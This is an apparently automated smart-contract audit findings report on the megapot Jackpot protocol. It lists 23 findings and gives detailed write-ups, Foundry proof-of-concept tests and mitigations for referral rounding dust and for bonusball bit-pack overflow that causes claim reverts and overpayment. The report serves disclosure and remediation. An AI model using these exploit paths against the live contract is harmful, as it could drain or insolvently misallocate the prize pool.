# 2025 11 megapot - Findings Report
## Commit hash: f0a7297d59c376e38b287b2c56740617dbbfbdc7

##Findings by Pattern


 **Derived From** : Referral rounding dust not allocated causes persistent accounting drift

[L-1]. Per-split referral flooring strands USDC in Jackpot._validateAndTrackReferrals/_payReferrersWinnings causing cumulative accounting drift
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : for all drawings d: drawingState[d].ballMax + drawingState[d].bonusballMax <= 255

[M-2]. Bit-pack overflow creates phantom bonusball match: claims underflow/DoS and mis-tier payouts from Jackpot.scaledEntropyCallback
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 7
Privilege: Permissionless



 **Derived From** : Bonusball bit-pack overflow corrupts tiering and can revert/overpay claims

[H-3]. Unbounded bonusballMax in Jackpot._setNewDrawingState breaks bitpacking and tiering when normalMax+bonusball>255
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 7
Privilege: Permissionless



 **Derived From** : (_maxRange - _minRange + 1) does not overflow

[L-4]. Entropy callback DoS via range overflow in ScaledEntropyProvider._drawWithReplacement bricks randomness delivery
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : Pending keyed only by sequence causes cross‑provider collisions and misdelivery

[M-5]. Cross-provider sequence collisions in ScaledEntropyProvider._storePendingRequest cause misdelivery and permanent loss of entropy requests
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 6
Privilege: RequiresAdminRole



 **Derived From** : Unbounded iteration in getUserTickets can gas-DoS on-chain callers

[L-6]. Unbounded loop and array allocation in JackpotBridgeManager.getUserTickets enable gas-based DoS against on-chain integrations
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: Permissionless



 **Derived From** : getLPValueBreakdown underflows on drawing 0 (currentDrawingId - 1)

[L-7]. getLPValueBreakdown reverts at bootstrap (drawing 0) due to currentDrawingId - 1 underflow, DoS for LP valuation previews
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: Permissionless



 **Derived From** : forall no-replacement sets: samples <= (maxRange - minRange + 1)

[L-8]. Entropy callback DoS via unchecked no-replacement sample bound in ScaledEntropyProvider._getScaledRandomness
Finding Status: Valid
Status Confidence: SomeWhatConfident
Finding Confidence Justification: Jackpot.sol isn’t included here to verify explicit guardrails (e.g., enforcing normalBallMax >= 5). The documentation and invariants strongly imply such constraints, but without the concrete setter checks, there is slight uncertainty. Even so, the impact still requires trusted-admin misconfiguration.
Finding Complexity: 5
Privilege: Permissionless



 **Derived From** : Referral distribution rounding dust accumulates and is never credited

[L-9]. Unassigned remainder in Jackpot referral splitting accumulates as untracked USDC (penny-shaving over time)
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : Unbounded iteration over user-owned tickets can cause gas-based DoS for on-chain callers

[L-10]. Unbounded loop with external call in JackpotTicketNFT.getUserTickets enables gas-based DoS against integrators
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: Permissionless



 **Derived From** : Provider change can corrupt pending randomness due to per-provider sequence collisions

[M-11]. Provider switch reuses sequence IDs across providers, overwriting pending[sequence] → wrong callback delivery and DoS (UnknownSequence) in ScaledEntropyProvider.setEntropyProvider
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: RequiresAdminRole



 **Derived From** : Sequence-only pending key + ignored provider lets provider rotation hijack callbacks

[M-12]. Provider rotation overwrites pending[sequence], misroutes randomness and bricks prior request via UnknownSequence
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 7
Privilege: RequiresAdminRole



 **Derived From** : Mid-drawing payout-calculator swap zeroes all tier payouts due to missing snapshot guard

[M-13]. GuaranteedMinimumPayoutCalculator can settle with uninitialized snapshot after mid-drawing swap, zeroing all tier payouts
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: RequiresAdminRole



 **Derived From** : Let a = getTicketInfo(tokenId) and b = getExtendedTicketInfo(tokenId). Then b.ticketId == tokenId AND b.ticket.drawingId == a.drawingId AND b.ticket.packedTicket == a.packedTicket AND b.ticket.referralScheme == a.referralScheme AND b.normals.length == 5 AND b.bonusball >= 1

[M-14]. Bit-packing overflow breaks JackpotTicketNFT.getExtendedTicketInfo: normals length != 5 and bonusball == 0 when normalBallMax + bonusball > 255
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 7
Privilege: Permissionless



 **Derived From** : No-referral winnings credited to current round lpEarnings skews accounting across rounds

[M-15]. claimWinnings time-shifts “no-referral” referrerShare into arbitrary future round lpEarnings, inflating fees and breaking per-round accounting
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 6
Privilege: Permissionless



 **Derived From** : Price desync: BridgeManager charges global ticketPrice, stranding overpayments

[H-16]. BridgeManager.buyTickets over/undercharges due to desynced global vs per‑drawing ticket price, causing stranded USDC or DoS
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: Permissionless



 **Derived From** : forall t in returned ticketIds: IERC721(address(jackpotTicketNFT)).ownerOf(t) == address(this) && ticketOwner[t] == _recipient

[L-17]. Anyone can mint tickets to BridgeManager and desync custody vs ticketOwner mapping, permanently orphaning tickets
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 3
Privilege: Permissionless



 **Derived From** : Emergency refunds use current referralFee instead of purchase-time value, over/under-refunding

[M-18]. Emergency refunds mis-account referred tickets by using mutable referralFee, enabling refund+referral double-payout
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: Permissionless



 **Derived From** : Emergency refunds don’t reverse combo-tracker/prize-pool state → double-count and insolvency risk

[L-19]. Refunded tickets still counted as winners after disabling emergency mode cause LP losses and underpaid winners
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: RequiresAdminRole



 **Derived From** : Pending requests never expire; permissionless storage bloat via failing callbacks

[L-20]. Permanent storage bloat via stuck pending requests in ScaledEntropyProvider.requestAndCallbackScaledRandomness
Finding Status: Valid
Status Confidence: Confident
Finding Complexity: 4
Privilege: Permissionless



 **Derived From** : address(this).balance == 0

[I-21]. Stranded ETH in ScaledEntropyProvider due to forced ETH with no recovery path
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 2
Privilege: Permissionless



 **Derived From** : for all i in _requests: _requests[i].withReplacement || (_requests[i].samples <= (_requests[i].maxRange - _requests[i].minRange + 1))

[L-22]. Invalid no-replacement requests pass validation and brick entropy callbacks, locking downstream consumers (e.g., Jackpot)
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 3
Privilege: Permissionless



 **Derived From** : pending[sequence].callback == msg.sender && pending[sequence].selector == _selector && pending[sequence].setRequests.length == _requests.length

[M-23]. Provider switch lets attacker collide sequence keys and overwrite pending[sequence], hijacking/DoSing entropy callbacks
Finding Status: Valid
Status Confidence: VeryConfident
Finding Complexity: 6
Privilege: Permissionless


### Number of Findings
- C: 0
- H: 2
- M: 9
- L: 11
- I: 1

##Findings by Pattern


 **Derived From** : Referral rounding dust not allocated causes persistent accounting drift

## [L-1]. Per-split referral flooring strands USDC in Jackpot._validateAndTrackReferrals/_payReferrersWinnings causing cumulative accounting drift

### Finding Severity Justification: Per-referrer flooring in both purchase-time and claim-time referral distributions can leave tiny remainders (dust) unallocated. This does not endanger solvency or enable theft; it results in minor underpayments spread across referrers/winners and the remainder staying in the contract. The project’s rules explicitly accept small dust favoring solvency, so impact is limited to minor accounting drift, fitting QA/Low.
## Derived From Pattern/Invariant
Referral rounding dust not allocated causes persistent accounting drift

## Exploit Type
AccountingInvariantViolation

## Location
Jackpot.Jackpot._validateAndTrackReferrals

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 4
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
In both purchase-time and claim-time referral flows, amounts are split with integer division per referrer and floored, but the leftover remainder is not allocated to any bucket (LP or referrers). This creates stranded USDC in the contract balance that is not reflected in lpEarnings or referralFees, drifting accounting over time. Vulnerable snippets: (1) buyTickets → _validateAndTrackReferrals: referralFeeTotal = ticketsValue * referralFee / 1e18; for each i: referrerFee = referralFeeTotal * split[i] / 1e18; referralFees[referrer] += referrerFee; The sum of floors ≤ referralFeeTotal; the leftover remainder is discarded (not added to lpEarnings or any accumulator). lpEarnings is updated by ticketsValue − referralFeeTotal, so dust is not captured by LP either. (2) claimWinnings → _payReferrersWinnings: referrerShare = winningAmount * referralWinShare / 1e18; for each i: referrerFee = referrerShare * split[i] / 1e18; referralFees[referrer] += referrerFee; Caller payout is reduced by the full referrerShare, but only floor-summed amounts are actually credited; the difference is again stranded. Over many purchases/claims this produces non-trivial dust left in contract, violating conservation (emitted != accounted) and preventing migration to LPs via settlement.

## Impact
Contract accumulates stranded USDC not represented in lpEarnings or referralFees; referrers are underpaid by per-split dust and LPs don’t receive it either. Over volume this drifts accounting from actual balance, complicates reconciliation and leaves funds permanently stuck.

## Command to Run Test


## Proof of Concept
1) Attacker chooses a referral scheme with many referrers and splits summing to 1e18 (e.g., 7 refs with uneven shares). 2) Call buyTickets with 1 ticket. 3) referralFeeTotal is computed once; per-referrer credits are floored. 4) Sum(referralFees[referrer_i]) < referralFeeTotal and the difference is not added to lpEarnings or any mapping. 5) Repeating purchases or winning claims amplifies the stranded dust. 6) Assertion: (referralFeeTotal - Σcredited) > 0 while drawingState[currentDrawingId].lpEarnings == ticketsValue - referralFeeTotal, proving the remainder is not captured anywhere.

## Proof of Code
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {Jackpot} from "contracts/Jackpot.sol";
import {JackpotLPManager} from "contracts/JackpotLPManager.sol";
import {JackpotTicketNFT} from "contracts/JackpotTicketNFT.sol";
import {GuaranteedMinimumPayoutCalculator} from "contracts/GuaranteedMinimumPayoutCalculator.sol";
import {IJackpot} from "contracts/interfaces/IJackpot.sol";
import {IScaledEntropyProvider} from "contracts/interfaces/IScaledEntropyProvider.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MockUSDC is IERC20 {
    string public name = "MockUSDC";
    string public symbol = "mUSDC";
    uint8 public decimals = 6;
    uint256 public override totalSupply;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 value) external override returns (bool) {
        require(balanceOf[msg.sender] >= value, "bal");
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        return true;
    }

    function approve(address spender, uint256 value) external override returns (bool) {
        allowance[msg.sender][spender] = value;
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external override returns (bool) {
        require(balanceOf[from] >= value, "bal");
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= value, "allow");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - value;
        balanceOf[from] -= value;
        balanceOf[to] += value;
        return true;
    }
}

contract DummyEntropy is IScaledEntropyProvider {
    function requestAndCallbackScaledRandomness(
        uint32,
        SetRequest[] memory,
        bytes4,
        bytes memory
    ) external payable returns (uint64) {
        return 0;
    }
    function getFee(uint32) external view returns (uint256) { return 0; }
}

contract ReferralDustTest is Test {
    MockUSDC usdc;
    Jackpot jackpot;
    JackpotLPManager lpMgr;
    JackpotTicketNFT nft;
    DummyEntropy entropy;
    GuaranteedMinimumPayoutCalculator payoutCalc;

    address owner = address(this);
    address lp = address(0xBEEF);
    address attacker = address(0xA11CE);

    uint256 constant PRECISE_UNIT = 1e18;

    function setUp() public {
        usdc = new MockUSDC();

        // Constructor params
        uint256 drawingDurationInSeconds = 1 days;
        uint8 normalBallMax = 35;
        uint8 bonusballMin = 4;
        uint256 lpEdgeTarget = 20e16; // 20%
        uint256 reserveRatio = 10e16; // 10%
        uint256 referralFee = 3e16;   // 3%
        uint256 referralWinShare = 0; // unused here
        uint256 protocolFee = 0;
        uint256 protocolFeeThreshold = 0;
        uint256 ticketPrice = 1_000_000; // 1 USDC (6 decimals)
        uint256 maxReferrers = 10;
        uint32 entropyBaseGasLimit = 500000;

        jackpot = new Jackpot(
            drawingDurationInSeconds,
            normalBallMax,
            bonusballMin,
            lpEdgeTarget,
            reserveRatio,
            referralFee,
            referralWinShare,
            protocolFee,
            protocolFeeThreshold,
            ticketPrice,
            maxReferrers,
            entropyBaseGasLimit
        );

        lpMgr = new JackpotLPManager(jackpot);
        nft = new JackpotTicketNFT(jackpot);
        entropy = new DummyEntropy();

        // Set a trivial payout calculator (weights sum to 1e18)
        bool[12] memory minTiers;
        uint256[12] memory weights;
        weights[11] = PRECISE_UNIT; // all weight to jackpot tier; fine for this test
        payoutCalc = new GuaranteedMinimumPayoutCalculator(jackpot, 0, 0, minTiers, weights);

        // Wire dependencies
        jackpot.initialize(IERC20(address(usdc)), lpMgr, nft, entropy, payoutCalc);

        // Initialize LP deposits
        jackpot.initializeLPDeposits(1_000_000_000_000); // governance cap

        // Fund LP and deposit
        usdc.mint(lp, 1_000_000_000); // 1,000 USDC
        vm.startPrank(lp);
        usdc.approve(address(jackpot), type(uint256).max);
        jackpot.lpDeposit(500_000_000); // 500 USDC
        vm.stopPrank();

        // Start jackpot
        jackpot.initializeJackpot(block.timestamp + 1 hours);

        // Fund attacker for ticket buy
        usdc.mint(attacker, ticketPrice);
        vm.prank(attacker);
        usdc.approve(address(jackpot), ticketPrice);
    }

    function test_referral_dust_on_buyTickets() public {
        // Prepare 1 ticket
        IJackpot.Ticket[] memory tks = new IJackpot.Ticket[](1);
        uint8[] memory normals = new uint8[](5);
        normals[0]=1; normals[1]=2; normals[2]=3; normals[3]=4; normals[4]=5;
        tks[0] = IJackpot.Ticket({normals: normals, bonusball: 1});

        // 7 referrers with exact-sum splits (create flooring on per-split)
        address[] memory refs = new address[](7);
        uint256[] memory splits = new uint256[](7);
        for (uint256 i=0;i<6;i++) {
            refs[i] = address(uint160(0x1000 + i));
            splits[i] = PRECISE_UNIT / 7; // floor share
        }
        refs[6] = address(uint160(0x1000 + 6));
        // last one gets the remainder to make sum == 1e18 exactly
        uint256 sum6 = (PRECISE_UNIT / 7) * 6;
        splits[6] = PRECISE_UNIT - sum6;

        // Execute purchase
        vm.prank(attacker);
        jackpot.buyTickets(tks, attacker, refs, splits, bytes32("src"));

        // Compute referralFeeTotal
        Jackpot.DrawingState memory ds = jackpot.getDrawingState(jackpot.currentDrawingId());
        uint256 ticketsValue = ds.ticketPrice; // bought 1 ticket
        uint256 referralFeeTotal = ticketsValue * jackpot.referralFee() / PRECISE_UNIT;

        // Sum credited per-referrer and locate the dust remainder
        uint256 credited;
        for (uint256 i=0;i<refs.length;i++) {
            credited += jackpot.referralFees(refs[i]);
        }

        // Assert per-split flooring created dust and it's not captured by lpEarnings
        assertGt(referralFeeTotal, credited, "no dust created");
        uint256 dust = referralFeeTotal - credited; // stranded in contract
        assertGt(dust, 0, "dust must be > 0");

        // lpEarnings only got ticketsValue - referralFeeTotal, so dust not captured by LP either
        assertEq(ds.lpEarnings, ticketsValue - referralFeeTotal, "lpEarnings should exclude referral dust");
    }
}


## Suggested Mitigation
Ensure conservation by allocating the per-split remainder. Options: (A) Track sumCredited in the loop and after the loop add (referralFeeTotal − sumCredited) to lpEarnings; (B) Add the remainder to one referrer (e.g., the last) so Σcredits == referralFeeTotal; (C) Maintain a dedicated referralRemainder accumulator that is periodically swept to LPs. Apply the same fix in _payReferrersWinnings so the withheld winner referrerShare exactly equals Σcredited + allocated remainder.





 **Derived From** : for all drawings d: drawingState[d].ballMax + drawingState[d].bonusballMax <= 255

## [M-2]. Bit-pack overflow creates phantom bonusball match: claims underflow/DoS and mis-tier payouts from Jackpot.scaledEntropyCallback

### Finding Severity Justification: The protocol fails to enforce the bit-packing invariant ballMax + bonusballMax <= 255. When exceeded, the bonusball bit overflows the 256-bit vector and is lost, causing every ticket to appear to match the bonusball. This makes tier computation wrong and reverts for legitimate tier-1 winners (0 normals + bonusball), and misclassifies all other winners (e.g., k normals maps to tier 2k-1). Impact: denial of service for a class of winners and incorrect payouts across tiers, which can deviate from the precomputed tier budgets and threaten solvency. Likelihood depends on parameter growth (bonusballMax > 127 when normalBallMax <= 128), so it is lower, but the impact on settled winnings is material.
## Derived From Pattern/Invariant
for all drawings d: drawingState[d].ballMax + drawingState[d].bonusballMax <= 255

## Exploit Type
IntegerMath

## Location
Jackpot.scaledEntropyCallback

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 7
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
Jackpot._setNewDrawingState computes bonusballMax without capping to (255 - ballMax). When ballMax + bonusballMax > 255, all bit-packs that set the bonusball bit do: 1 << (bonusball + ballMax) which overflows the 256-bit word and yields 0. This corrupts packed tickets and winningTicket, making the bonusball bit effectively absent. Later, _calculateTicketTierId shifts both packed values by (ballMax + 1) and compares equality to detect bonusball matches. With both shifted values equal to 0, every ticket appears to match the bonusball. The formula then subtracts bonusballMatch from the normal match count: return 2 * (matches - bonusballMatch) + bonusballMatch; If matches == 0, this underflows (0 - 1) and reverts, causing a DoS for valid tier-1 winners (0 normals + bonusball match). Even when matches > 0, the tier id is misclassified as 2*k - 1 instead of 2*k (no bonusball) or 2*k + 1 (with bonusball), leading to incorrect payouts. Vulnerable snippet: in Jackpot._setNewDrawingState: uint8 newBonusball = uint8(Math.max(bonusballMin, Math.ceilDiv(minNumberTickets, combosPerBonusball))); newDrawingState.bonusballMax = newBonusball; and in TicketComboTracker.insert: ticketNumbers = set |= 1 << (_bonusball + _tracker.normalMax); and in Jackpot._calculateTicketTierId: uint256 ticketBonusball = _ticketNumbers >> (_normalBallMax + 1); uint256 winningBonusball = _winningNumbers >> (_normalBallMax + 1); uint256 bonusballMatch = (ticketBonusball == winningBonusball) ? 1 : 0; return 2 * (matches - bonusballMatch) + bonusballMatch;

## Impact
If ballMax + bonusballMax exceeds 255, the bonusball bit overflows the 256-bit pack and evaluates to zero. This produces a phantom bonusball match because both ticket and winning "bonusball fields" shift to zero and compare equal. Consequences: (a) tickets with zero normal matches revert on claim due to underflow in tier computation; (b) all other winners are misclassified as if they matched the bonusball, shifting payouts across tiers and deviating from precomputed budgets; (c) unpacking helpers can revert due to malformed packed tickets, degrading UX. This can be triggered if drawing parameters let bonusballMax grow beyond 255 - normalBallMax.

## Command to Run Test


## Proof of Concept
Setup: Any drawing where normalBallMax + bonusballMax > 255 (e.g., normalBallMax=250 and bonusballMax>5). When tickets and the winning number are packed, the bonusball bit is written at position normalMax+bonusball; for values >255 this becomes 1 << >=256 which evaluates to 0 in Solidity, losing the bit.
Exploit A (DoS on Tier-1: 0 normals + bonusball):
- Given a winner with zero normal overlap and a bonusball chosen in the overflow range, both ticket and winning packed values have no bonusball bit set (zero above normalMax).
- In _calculateTicketTierId, ticketBonusball = ticketPacked >> (normalMax+1) and winningBonusball = winningPacked >> (normalMax+1) both equal 0, thus bonusballMatch = 1.
- matches = popCount(ticketPacked & winningPacked) = 0 (since no normals matched and bonusball bit is absent).
- Tier formula 2*(matches - bonusballMatch) + bonusballMatch underflows at (0 - 1) and reverts, DoSing legitimate claims.
Exploit B (Misclassification for k>0 normals):
- With k normal matches and missing bonusball bit, bonusballMatch is still 1 due to 0==0 comparison, but matches was counted without the bonusball.
- Returned tier becomes 2*(k - 1) + 1 = 2k - 1, misclassifying the ticket as if it matched the bonusball, skewing payouts.

## Proof of Code
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {Jackpot} from "contracts/Jackpot.sol";

contract JackpotHarness is Jackpot {
    constructor()
        Jackpot(
            1,          // drawingDurationInSeconds
            1,          // normalBallMax (unused by exposeTier)
            1,          // bonusballMin
            1e16,       // lpEdgeTarget
            0,          // reserveRatio
            0,          // referralFee
            0,          // referralWinShare
            0,          // protocolFee
            1,          // protocolFeeThreshold
            1,          // ticketPrice
            1,          // maxReferrers
            21000       // entropyBaseGasLimit
        )
    {}

    function exposeTier(uint256 ticketPacked, uint256 winningPacked, uint256 normalMax)
        external
        pure
        returns (uint256)
    {
        return _calculateTicketTierId(ticketPacked, winningPacked, normalMax);
    }
}

contract BitPackOverflowTest is Test {
    JackpotHarness harness;

    function setUp() public {
        harness = new JackpotHarness();
    }

    function _packNormals(uint8[] memory nums) internal pure returns (uint256 v) {
        for (uint256 i; i < nums.length; i++) {
            v |= (uint256(1) << nums[i]);
        }
    }

    function _arr(uint8 a,uint8 b,uint8 c,uint8 d,uint8 e) internal pure returns (uint8[] memory r){
        r = new uint8[](5); r[0]=a; r[1]=b; r[2]=c; r[3]=d; r[4]=e;
    }

    // Demonstrates underflow DoS when both bonusball fields overflow and compare equal to zero.
    function test_DoS_Underflow_ZeroNormals_PhantomBonusball() public {
        uint256 normalBallMax = 250; // implies any bonusball > 5 overflows the bit pack
        // No overlapping normals and no bonusball bit set in either packed value (simulate overflowed bonusball)
        uint256 ticketPacked = _packNormals(_arr(1,2,3,4,5));
        uint256 winningPacked = _packNormals(_arr(6,7,8,9,10));
        vm.expectRevert();
        harness.exposeTier(ticketPacked, winningPacked, normalBallMax);
    }

    // Demonstrates misclassification: k normals -> tier 2k-1 due to phantom bonusball match (0==0)
    function test_Misclassification_KNormals_PhantomBonusball() public {
        uint256 normalBallMax = 250; // overflow zone for bonusball
        // 3 normal overlaps (1,2,3). No bonusball bit present in either (simulating overflow).
        uint256 ticketPacked = _packNormals(_arr(1,2,3,4,5));
        uint256 winningPacked = _packNormals(_arr(1,2,3,9,10));
        uint256 tier = harness.exposeTier(ticketPacked, winningPacked, normalBallMax);
        // Expected wrong tier due to bug: 2*(3 - 1) + 1 = 5 (instead of 2*3 = 6 or 7)
        assertEq(tier, 5, "Expected misclassified tier 2k-1 due to phantom bonusball match");
    }
}


## Suggested Mitigation
- Enforce packing bounds at drawing initialization and tracker setup:
  - In Jackpot._setNewDrawingState, cap the computed bonusballMax so that normalBallMax + bonusballMax <= 255:
    - uint8 maxBonus = uint8(MAX_BIT_VECTOR_SIZE - normalBallMax);
    - uint8 raw = uint8(Math.max(bonusballMin, Math.ceilDiv(minNumberTickets, combosPerBonusball)));
    - newDrawingState.bonusballMax = raw > maxBonus ? maxBonus : raw;
  - Add a hard check in TicketComboTracker.init: require(_normalMax + _bonusballMax <= 255, "Bit-pack overflow");
  - Optionally, guard admin setters:
    - setBonusballMin: require(_bonusballMin <= MAX_BIT_VECTOR_SIZE - normalBallMax);
    - setNormalBallMax: require(_normalBallMax <= 128) (aligns with Combinations.choose) and ensure bonusballMin <= 255 - _normalBallMax.
- Make tier computation robust against absent bonusball bits to prevent underflow and phantom matches even if a bound is ever violated:
  - In _calculateTicketTierId, compute normal matches only and treat zero==zero as no bonusball match:
    - normalMatches = popCount((_ticketNumbers & _winningNumbers) & ((uint256(1) << (_normalBallMax + 1)) - 2));
    - ticketBonus = _ticketNumbers >> (_normalBallMax + 1);
    - winningBonus = _winningNumbers >> (_normalBallMax + 1);
    - bonusballMatch = (ticketBonus != 0 && winningBonus != 0 && ticketBonus == winningBonus) ? 1 : 0;
    - return 2 * normalMatches + bonusballMatch;
This combination of proactive caps and defensive computation fully eliminates the overflow condition, prevents claim DoS, and preserves correct tier classification.





 **Derived From** : Bonusball bit-pack overflow corrupts tiering and can revert/overpay claims

## [H-3]. Unbounded bonusballMax in Jackpot._setNewDrawingState breaks bitpacking and tiering when normalMax+bonusball>255

### Finding Severity Justification: bonusballMax is not clamped against the bitpacking limit (255 - normalBallMax). When normalBallMax + bonusballMax > 255, the bonusball bit is silently dropped during packing, causing all tickets to appear as if their bonusball matched. This misclassifies tiers at claim time, enabling overpayment beyond the prize pool (assets loss) and causing underflow reverts for 0-normal-match tickets. The path is permissionless and does not rely on trusted roles; it can be triggered by buying enough tickets in the prior round to inflate the next round’s prize pool so that ceilDiv(minTickets, C(normalMax,5)) exceeds 255 - normalMax. With smaller normalBallMax values (e.g., 20–35), the required ticket volume is realistically reachable.
## Derived From Pattern/Invariant
Bonusball bit-pack overflow corrupts tiering and can revert/overpay claims

## Exploit Type
AccountingInvariantViolation

## Location
Jackpot._setNewDrawingState

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 7
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
Jackpot packs tickets as a uint256 bitset: normals occupy bits [1..ballMax], and the bonusball is stored at bit (ballMax + bonusball). In _setNewDrawingState(), bonusballMax is computed without an upper bound:

- _setNewDrawingState:
  combosPerBonusball = Combinations.choose(normalBallMax, 5)
  minNumberTickets = newPrizePool * 1e18 / ((1e18 - lpEdgeTarget) * ticketPrice)
  newBonusball = uint8(Math.max(bonusballMin, Math.ceilDiv(minNumberTickets, combosPerBonusball)))
  newDrawingState.bonusballMax = newBonusball
  TicketComboTracker.init(..., normalBallMax, newBonusball, ...)

- TicketComboTracker.insert:
  ticketNumbers = set |= 1 << (_bonusball + _tracker.normalMax)

- Jackpot._calculateTicketTierId:
  ticketBonusball = _ticketNumbers >> (_normalBallMax + 1)
  winningBonusball = _winningNumbers >> (_normalBallMax + 1)
  bonusballMatch = (ticketBonusball == winningBonusball) ? 1 : 0

If normalBallMax + bonusball (or bonusballMax) exceeds 255, the left shift 1 << (bonusball + normalMax) overflows the uint256 width and evaluates to 0, silently dropping the bonusball bit in both tickets and the winning combination. Later, right-shifting by (normalMax + 1) yields 0 for both, making bonusballMatch spuriously true. This breaks accounting invariants: (a) claims with 0 normal matches underflow and revert in tier computation (2*(matches - 1) + 1), creating DoS for valid winners, and (b) non-zero matches are over-tiered (treated as if bonusball matched), overpaying users and misallocating the prize pool. The protocol never enforces ballMax + bonusballMax ≤ 255 at drawing transitions or admin setters (bonusballMin can be set arbitrarily high), so a large next-round prize pool or misconfigured bonusballMin can produce an unrepresentable bonusball, corrupting settlement/tiering for the entire round.

## Impact
If normalBallMax + bonusballMax exceeds 255, the packed bonusball bit silently drops to 0. As a result, during claims every ticket appears to have a bonusball match, and tickets with 0 normal matches revert due to underflow in tier computation. More critically, payoutCalculator tier amounts are computed from correct per-tier counts (based on the integer bonusball value), while claim classification is corrupted (based on the packed bit), so users can claim higher tiers than budgeted. This misalignment enables overpayment beyond the prize pool and can render the LP pool insolvent. The condition can be reached either by: (a) misconfiguration (owner sets bonusballMin too high or normalBallMax too high), or (b) permissionlessly inflating next round’s prize pool via massive ticket purchases so that ceilDiv(minTickets, C(normalMax,5)) > 255 - normalBallMax. Even if (b) is operationally heavy for some parameterizations, (a) is an immediate and realistic risk unless invariants are enforced.

## Command to Run Test


## Proof of Concept
- Pre-condition: normalBallMax is small (e.g., 10 or 20) and bonusballMin is not capped versus 255 - normalBallMax.
- Step 1: In drawing N, a user (permissionless) buys a very large number of tickets, making currentDrawingState.lpEarnings huge. No cap exists on number of tickets sold.
- Step 2: On settlement, newLPValue = lpPoolTotal + lpEarnings − userWinnings − protocolFee. With enormous lpEarnings and bounded userWinnings (limited by drawing N prize pool), newLPValue grows very large.
- Step 3: _setNewDrawingState computes newPrizePool = newLPValue*(1 - reserveRatio) and then newBonusball = ceil(minTickets/combosPerBonusball). Since minTickets scales with newPrizePool, newBonusball can exceed (255 - normalBallMax).
- Step 4: TicketComboTracker.init for drawing N+1 uses this oversized bonusballMax. When tickets are inserted, left shift 1 << (bonusball + normalMax) overflows to 0, dropping bonusball bits.
- Step 5: During claims for drawing N+1, _calculateTicketTierId sees ticketBonusball == winningBonusball == 0, setting bonusballMatch=1 for all tickets. If matched normals=0, tier math underflows and reverts; if >0, tickets are over-tiered and overpaid, misallocating funds.

## Proof of Code
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {TicketComboTracker} from "contracts/lib/TicketComboTracker.sol";
import {LibBit} from "solady/src/utils/LibBit.sol";

// Harness that reproduces Jackpot._calculateTicketTierId logic
contract TierHarness {
    function pack(uint8[] memory normals, uint8 normalMax, uint8 bb) public pure returns (uint256) {
        uint256 set = TicketComboTracker.toNormalsBitVector(normals, normalMax);
        return set | (uint256(1) << (uint256(bb) + normalMax));
    }

    function calc(uint256 t, uint256 w, uint256 normalMax) public pure returns (uint256) {
        uint256 matches = LibBit.popCount(t & w);
        uint256 ticketBB = t >> (normalMax + 1);
        uint256 winningBB = w >> (normalMax + 1);
        uint256 bbMatch = (ticketBB == winningBB) ? 1 : 0;
        return 2 * (matches - bbMatch) + bbMatch; // underflows if matches==0 and bbMatch==1
    }
}

contract BitpackOverflowTest is Test {
    TierHarness h;

    function setUp() public { h = new TierHarness(); }

    // Demonstrates DoS: with 0 normal matches, spurious bonusballMatch causes underflow revert
    function test_BonusballOverflowBreaksTiering_and_CausesUnderflow() public {
        uint8 normalMax = 250;        // leaves only 5 usable bits up to 255
        uint8 ticketBB = 10;          // 250 + 10 = 260 -> left shift overflows to 0
        uint8 winningBB = 7;          // 250 + 7 = 257 -> left shift overflows to 0

        // Ticket normals and winning normals do not overlap (0 matches)
        uint8[] memory normalsTicket = new uint8[](5);
        normalsTicket[0]=1; normalsTicket[1]=2; normalsTicket[2]=3; normalsTicket[3]=4; normalsTicket[4]=5;
        uint8[] memory normalsWin = new uint8[](5);
        normalsWin[0]=6; normalsWin[1]=7; normalsWin[2]=8; normalsWin[3]=9; normalsWin[4]=10;

        uint256 t = h.pack(normalsTicket, normalMax, ticketBB); // bonusball bit dropped
        uint256 w = h.pack(normalsWin,   normalMax, winningBB); // bonusball bit dropped

        // Both appear to have bonusball == 0 after shifting
        assertEq(t >> (normalMax + 1), 0);
        assertEq(w >> (normalMax + 1), 0);

        // Now tier calc thinks bonusball matched (spurious 1), causing matches-bbMatch underflow
        vm.expectRevert();
        h.calc(t, w, normalMax);
    }

